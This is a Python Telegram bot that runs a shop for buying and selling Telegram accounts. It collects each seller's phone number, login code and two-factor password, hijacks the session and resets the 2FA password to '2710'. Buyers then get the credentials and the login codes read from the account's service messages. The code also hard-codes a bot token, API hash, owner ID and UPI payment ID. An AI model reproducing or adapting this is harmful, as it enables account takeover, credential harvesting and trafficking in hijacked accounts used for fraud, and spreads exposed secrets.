import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
import asyncio
import os
import threading
import re
from flask import Flask

# --- WEB SERVER FOR 24/7 ---
app = Flask('')
@app.route('/')
def home(): return "PRIME MASTER BOT IS RUNNING"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
}
active_logins = {}

if not os.path.exists('sessions'): os.makedirs('sessions')

# --- HELPERS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

# --- START (NO FORCE JOIN) ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    bot.send_message(message.chat.id, "🔥 **PRIME MASTER BOT READY**\n\nNo Force Join! Direct access granted.", reply_markup=main_menu())

# --- ADMIN: ADD STOCK (PROCESS: NUMBER -> OTP -> PASS -> LOGIN) ---
@bot.message_handler(commands=['addstock'])
def admin_add_stock_init(message):
    if not is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, "🌍 **Admin, kis country ka stock add karna hai?**")
    bot.register_next_step_handler(msg, admin_stock_country)

def admin_stock_country(message):
    c = message.text.upper()
    if c not in db['buy_rates']: return bot.send_message(message.chat.id, f"❌ Pehle `/addcountry {c}` karein.")
    msg = bot.send_message(message.chat.id, f"📞 **Enter {c} Number (+ sign ke sath):**")
    bot.register_next_step_handler(msg, admin_stock_number, c)

def admin_stock_number(message, country):
    phone = message.text.strip()
    bot.send_message(message.chat.id, f"⏳ {phone} pe OTP bhej raha hoon...")
    threading.Thread(target=login_worker, args=(message.chat.id, phone, country, "stock")).start()

# --- USER: SELL ID (PROCESS: NUMBER -> OTP -> AUTO 2FA 2710) ---
@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def user_sell_init(message):
    if not db['sell_rates']: return bot.send_message(message.chat.id, "❌ Selling disabled.")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def user_sell_country(message):
    c = message.text.split()[1]
    msg = bot.send_message(message.chat.id, f"📞 **Enter {c} Number (+ sign ke sath):**", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, user_sell_number, c)

def user_sell_number(message, country):
    phone = message.text.strip()
    bot.send_message(message.chat.id, "⏳ Connecting to Telegram...")
    threading.Thread(target=login_worker, args=(message.chat.id, phone, country, "sell")).start()

# --- LOGIN WORKER (FOR BOTH ADMIN & USER) ---
def login_worker(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country, 'mode': mode}
        bot.send_message(chat_id, "📩 **OTP Sent!** Enter code:")
        bot.register_next_step_handler_by_chat_id(chat_id, verify_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def verify_otp(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        finalize_login(message, d)
    except Exception as e:
        if "password" in str(e).lower():
            bot.send_message(message.chat.id, "🔐 **2FA Password Required.** Enter Password:")
            bot.register_next_step_handler_by_chat_id(message.chat.id, verify_2fa)
        else: bot.send_message(message.chat.id, "❌ OTP Wrong.")

def verify_2fa(message):
    pwd = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=pwd))
        finalize_login(message, d, pwd)
    except: bot.send_message(message.chat.id, "❌ Wrong 2FA.")

def finalize_login(message, d, pwd="No Password"):
    if d['mode'] == "sell":
        try: # Purana Feature: Auto change 2FA to 2710
            d['loop'].run_until_complete(d['client'](functions.account.UpdatePasswordSettingsRequest(
                new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="dob")
            )))
        except: pass
        uid = message.from_user.id
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{uid}_{d['country']}"))
        for a in db['admins']: bot.send_message(a, f"📦 **SELL REQ**\nUser: `{uid}`\nNum: `{d['phone']}`\n2FA Set: `2710`", reply_markup=markup)
        bot.send_message(message.chat.id, "✅ ID Connected! 2FA set to 2710. Payment will be added after admin check.")
    else:
        # Admin Stock Add
        db['stock'][d['country']].append(f"{d['phone']}:PASS:{pwd}")
        bot.send_message(message.chat.id, f"✅ **Stock Added!** ID {d['phone']} is now in {d['country']} inventory.")

# --- BUY ID SYSTEM (NEW OTP & LOGOUT FIX) ---
@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def buy_menu(message):
    if not db['buy_rates']: return bot.send_message(message.chat.id, "❌ Market Closed.")
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p} ({len(db['stock'].get(c, []))})", callback_data=f"buyid_{c}"))
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('buyid_'))
def buy_execute(call):
    c = call.data.split('_')[1]
    uid = call.from_user.id
    price = db['buy_rates'].get(c, 0)
    if db['users'].get(uid, {}).get('balance', 0) < price or not db['stock'].get(c):
        return bot.answer_callback_query(call.id, "Insufficient Balance/Stock!", show_alert=True)
    
    data = db['stock'][c].pop(0)
    phone = data.split(':')[0]
    db['users'][uid]['balance'] -= price
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📩 GET OTP", callback_data=f"gotp_{phone}"),
               types.InlineKeyboardButton("🚪 LOGOUT BOT", callback_data=f"lout_{phone}"))
    bot.send_message(uid, f"🛒 **BUY SUCCESS**\n\n🌍 Country: {c}\n📦 Data: `{data}`\n\n_OTP aur Logout ke liye niche buttons use karein._", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith(('gotp_', 'lout_')))
def handle_otp_logout(call):
    action, phone = call.data.split('_')
    threading.Thread(target=otp_logout_worker, args=(call, action, phone)).start()

def otp_logout_worker(call, action, phone):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        if action == 'gotp':
            msgs = loop.run_until_complete(client.get_messages(777000, limit=1))
            if msgs:
                txt = msgs[0].message
                otp = re.search(r'\b(\d{5})\b', txt)
                code = otp.group(1) if otp else "Not Found"
                bot.send_message(call.from_user.id, f"📩 **OTP FOR {phone}:** `{code}`\n\nFull Msg: `{txt}`")
            else: bot.answer_callback_query(call.id, "No OTP found yet.", show_alert=True)
        elif action == 'lout':
            loop.run_until_complete(client.log_out())
            bot.send_message(call.from_user.id, f"✅ Bot Session Logged Out from {phone}!")
            if os.path.exists(f"sessions/{phone}.session"): os.remove(f"sessions/{phone}.session")
    except Exception as e: bot.send_message(call.from_user.id, f"❌ Session Error: {e}")
    finally: loop.run_until_complete(client.disconnect())

# --- DEPOSIT FLOW (PURANA) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def dep_s(message):
    msg = bot.send_message(message.chat.id, "💵 **Enter Amount:**")
    bot.register_next_step_handler(msg, dep_u)

def dep_u(message):
    try:
        amt = int(message.text)
        msg = bot.send_message(message.chat.id, f"💳 Pay to: `{db['upi']}`\nSend **12-digit UTR**:")
        bot.register_next_step_handler(msg, dep_ss, amt)
    except: bot.send_message(message.chat.id, "❌ Invalid.")

def dep_ss(message, amt):
    utr = message.text.strip()
    if len(utr) != 12: return bot.send_message(message.chat.id, "❌ Invalid UTR.")
    msg = bot.send_message(message.chat.id, "📸 Send Screenshot:")
    bot.register_next_step_handler(msg, dep_f, amt, utr)

def dep_f(message, amt, utr):
    if message.content_type != 'photo': return bot.send_message(message.chat.id, "❌ Photo only.")
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"da_{uid}_{amt}"))
    for a in db['admins']: bot.send_photo(a, message.photo[-1].file_id, caption=f"DEP: {uid} | ₹{amt}\nUTR: {utr}", reply_markup=markup)
    bot.send_message(message.chat.id, "⏳ Wait for admin.")

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['admin'])
def adm_m(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, "👑 **ADMIN PANEL**\n\n🌍 `/addcountry COUNTRY BUY SELL` \n➕ `/addstock` \n📢 `/broadcast` \n👤 `/addadmin ID` \n📈 `/list` \n💳 `/changeupi UPI` ")

@bot.message_handler(commands=['addcountry'])
def add_c(message):
    if not is_admin(message.from_user.id): return
    try:
        _, c, b, s = message.text.split()
        db['buy_rates'][c.upper()], db['sell_rates'][c.upper()] = int(b), int(s)
        db['stock'][c.upper()] = []
        bot.reply_to(message, f"✅ {c} added.")
    except: bot.reply_to(message, "Usage: `/addcountry INDIA 40 25`")

@bot.message_handler(commands=['broadcast'])
def bc_c(message):
    if not is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, "Msg:")
    bot.register_next_step_handler(msg, lambda m: [bot.send_message(u, f"📢 **UPDATE**\n\n{m.text}") for u in db['users']])

# --- BALANCE & SUPPORT ---
@bot.message_handler(func=lambda m: 'BALANCE' in m.text)
def check_bal(message): bot.send_message(message.chat.id, f"💳 Balance: ₹{db['users'].get(message.from_user.id, {}).get('balance', 0)}")

@bot.message_handler(func=lambda m: 'SUPPORT' in m.text)
def supp(message): bot.send_message(message.chat.id, "👤 Owner: @god_abhay")

@bot.callback_query_handler(func=lambda call: call.data.startswith(('da_', 'sa_')))
def handle_approvals(call):
    p = call.data.split('_')
    if p[0] == 'da':
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"✅ ₹{amt} added!")
    elif p[0] == 'sa':
        uid, country = int(p[1]), p[2]
        db['users'][uid]['balance'] += db['sell_rates'].get(country, 0)
        bot.send_message(uid, "✅ ID Sold! Payment Added.")
    bot.edit_message_text("Approved ✅", call.message.chat.id, call.message.message_id)

bot.polling(none_stop=True)
